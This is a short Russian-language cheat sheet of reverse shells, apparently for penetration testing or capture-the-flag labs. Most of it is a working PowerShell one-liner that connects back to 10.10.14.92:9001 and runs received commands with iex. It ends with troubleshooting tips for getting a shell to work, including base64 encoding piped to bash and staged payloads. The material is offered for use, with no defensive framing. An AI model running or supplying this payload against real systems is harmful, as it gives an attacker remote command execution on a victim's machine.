# Обратные шеллы

## Powershell

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.92',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Решение проблем

Почему мой шелл не работает?
- попробуйте кодировку base64 и передать через `base64 -d | bash`
- попробуйте указать `/bin/sh`
- попробуйте использовать стадированный пейло
- попробуйте преобразовать файл `.sh` в `sh` или `bash`
```
